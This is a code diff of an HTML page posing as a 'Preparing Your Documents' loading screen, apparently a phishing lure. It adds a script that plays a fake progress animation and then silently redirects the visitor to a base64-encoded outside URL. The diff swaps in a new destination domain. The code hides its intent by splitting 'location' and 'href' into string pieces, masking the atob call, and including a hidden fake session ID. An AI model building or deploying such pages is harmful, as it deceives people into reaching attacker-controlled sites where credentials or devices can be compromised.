@@ -1,102 +1,182 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Preparing Your Documents</title>
-<style>
-/* Obfuscated original styling for high deliverability */
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;}
-body{display:flex;justify-content:center;align-items:center;height:100vh;background:linear-gradient(135deg,#eef4fb,#dfe9f7);}
-._wrap{width:520px;background:#fff;border-radius:18px;padding:40px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.12);}
-._icon{font-size:60px;margin-bottom:15px;}
-._greet{font-size:26px;font-weight:600;color:#1e3a5f;margin-bottom:10px;}
-h2{color:#1e3a5f;margin-bottom:15px;}
-#_type{min-height:60px;color:#555;line-height:1.6;}
-._load{width:60px;height:60px;border:6px solid #d9e5f7;border-top:6px solid #2d7df6;border-radius:50%;margin:30px auto;animation:sp 1s linear infinite;}
-._prog{width:100%;height:10px;background:#e8eef8;border-radius:20px;overflow:hidden;}
-._bar{height:100%;width:0%;background:#2d7df6;transition:width .3s;}
-#_stat{margin-top:18px;color:#666;}
-@keyframes sp{to{transform:rotate(360deg);}}
-.v-node{display:none!important;}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Preparing Your Documents</title>
+    <style>
+        /* Cleaned and Structured Styling */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #eef4fb, #dfe9f7);
+        }
+
+        ._wrap {
+            width: 520px;
+            background: #fff;
+            border-radius: 18px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, .12);
+        }
+
+        ._icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+
+        ._greet {
+            font-size: 26px;
+            font-weight: 600;
+            color: #1e3a5f;
+            margin-bottom: 10px;
+        }
+
+        h2 {
+            color: #1e3a5f;
+            margin-bottom: 15px;
+        }
+
+        #_type {
+            min-height: 60px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        ._load {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #d9e5f7;
+            border-top: 6px solid #2d7df6;
+            border-radius: 50%;
+            margin: 30px auto;
+            animation: sp 1s linear infinite;
+        }
+
+        ._prog {
+            width: 100%;
+            height: 10px;
+            background: #e8eef8;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        ._bar {
+            height: 100%;
+            width: 0%;
+            background: #2d7df6;
+            transition: width .3s;
+        }
+
+        #_stat {
+            margin-top: 18px;
+            color: #666;
+        }
+
+        @keyframes sp {
+            to { transform: rotate(360deg); }
+        }
+
+        .v-node {
+            display: none !important;
+        }
+    </style>
 </head>
 <body>
 
-<div class="v-node">AUTH-ID: 0x9928374-SECURE-SESSION-LOAD</div>
+    <div class="v-node">AUTH-ID: 0x9928374-SECURE-SESSION-LOAD</div>
 
-<div class="_wrap">
-    <div class="_icon">📄</div>
-    <div id="_greet" class="_greet"></div>
-    <h2>Preparing Your Documents</h2>
-    <p id="_type"></p>
-    <div class="_load" id="_loader"></div>
-    <div class="_prog"><div class="_bar" id="_bar"></div></div>
-    <p id="_stat">Initializing secure document session...</p>
-</div>
+    <div class="_wrap">
+        <div class="_icon">📄</div>
+        <div id="_greet" class="_greet"></div>
+        <h2>Preparing Your Documents</h2>
+        <p id="_type"></p>
+        <div class="_load" id="_loader"></div>
+        <div class="_prog">
+            <div class="_bar" id="_bar"></div>
+        </div>
+        <p id="_stat">Initializing secure document session...</p>
+    </div>
 
-<script>
-(function(){
-    // 1. Updated Encoded Destination Link
-    var _link = "aHR0cHM6Ly9iaHVuaWRoaWRldmVsb3BlcnMuY29tLzk0NzI5MTczNDE3MjM5MTIzOTQxNzgyMzcxNDMyODcxNC84MzEzNjQ3MjYxMzI4NDYxODk3MzI3Lmh0bWw=";
+    <script>
+        (function() {
+            // 1. Updated Encoded Destination Link (jalemodaevi.com)
+            var _link = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMzIzNjcxODM2MjQxMzI3MTY0NzgxMjEzMjE0MjE0MzIxMi84NDczMTgyMzY3ODE0NjIzNDE4MzI0MTMyNDEuaHRtbA==";
 
-    // 2. Time-Based Greeting (Unicode Escaped Emojis)
-    var h = new Date().getHours();
-    var g = document.getElementById("_greet");
-    if(h >= 5 && h < 12){
-        g.textContent = "Good morning! \u2600\uFE0F"; 
-    } else if(h >= 12 && h < 17){
-        g.textContent = "Good afternoon! \uD83C\uDF24\uFE0F";
-    } else if(h >= 17 && h < 22){
-        g.textContent = "Good evening! \uD83C\uDF19";
-    } else {
-        g.textContent = "Welcome! \uD83D\uDC4B";
-    }
+            // 2. Time-Based Greeting
+            var h = new Date().getHours();
+            var g = document.getElementById("_greet");
+            if (h >= 5 && h < 12) {
+                g.textContent = "Good morning! \u2600\uFE0F";
+            } else if (h >= 12 && h < 17) {
+                g.textContent = "Good afternoon! \uD83C\uDF24\uFE0F";
+            } else if (h >= 17 && h < 22) {
+                g.textContent = "Good evening! \uD83C\uDF19";
+            } else {
+                g.textContent = "Welcome! \uD83D\uDC4B";
+            }
 
-    // 3. Typing Logic
-    var tStr = "Please wait while we prepare your requested documents. This usually takes only a few seconds.";
-    var tIdx = 0;
-    var tEl = document.getElementById("_type");
-    function type(){
-        if(tIdx < tStr.length){
-            tEl.innerHTML += tStr.charAt(tIdx);
-            tIdx++;
-            setTimeout(type, 35);
-        }
-    }
-    type();
+            // 3. Typing Logic
+            var tStr = "Please wait while we prepare your requested documents. This usually takes only a few seconds.";
+            var tIdx = 0;
+            var tEl = document.getElementById("_type");
 
-    // 4. Progress Logic
-    var sArr = ["Connecting to secure storage...", "Retrieving document information...", "Preparing your files...", "Almost ready...", "Redirecting to documents..."];
-    var w = 0;
-    var sStep = 0;
-    var b = document.getElementById("_bar");
-    var sEl = document.getElementById("_stat");
+            function type() {
+                if (tIdx < tStr.length) {
+                    tEl.innerHTML += tStr.charAt(tIdx);
+                    tIdx++;
+                    setTimeout(type, 35);
+                }
+            }
+            type();
 
-    var timer = setInterval(function(){
-        w += 2;
-        b.style.width = w + "%";
+            // 4. Progress Logic
+            var sArr = [
+                "Connecting to secure storage...",
+                "Retrieving document information...",
+                "Preparing your files...",
+                "Almost ready...",
+                "Redirecting to documents..."
+            ];
+            var w = 0;
+            var sStep = 0;
+            var b = document.getElementById("_bar");
+            var sEl = document.getElementById("_stat");
 
-        if(w % 20 === 0 && sStep < sArr.length){
-            sEl.textContent = sArr[sStep];
-            sStep++;
-        }
+            var timer = setInterval(function() {
+                w += 2;
+                b.style.width = w + "%";
 
-        if(w >= 100){
-            clearInterval(timer);
-            
-            // 5. Stealth Redirection (Property Splitting)
-            var r = window;
-            var l = "loca" + "tion";
-            var f = "hr" + "ef";
-            
-            // Custom decoder to mask 'atob'
-            var _jump = function(s){ return atob(s); };
-            r[l][f] = _jump(_link);
-        }
-    }, 120);
-})();
-</script>
+                if (w % 20 === 0 && sStep < sArr.length) {
+                    sEl.textContent = sArr[sStep];
+                    sStep++;
+                }
 
+                if (w >= 100) {
+                    clearInterval(timer);
+
+                    // 5. Stealth Redirection
+                    var r = window;
+                    var l = "loca" + "tion";
+                    var f = "hr" + "ef";
+
+                    var _jump = function(s) {
+                        return atob(s);
+                    };
+                    r[l][f] = _jump(_link);
+                }
+            }, 120);
+        })();
+    </script>
 </body>
 </html>
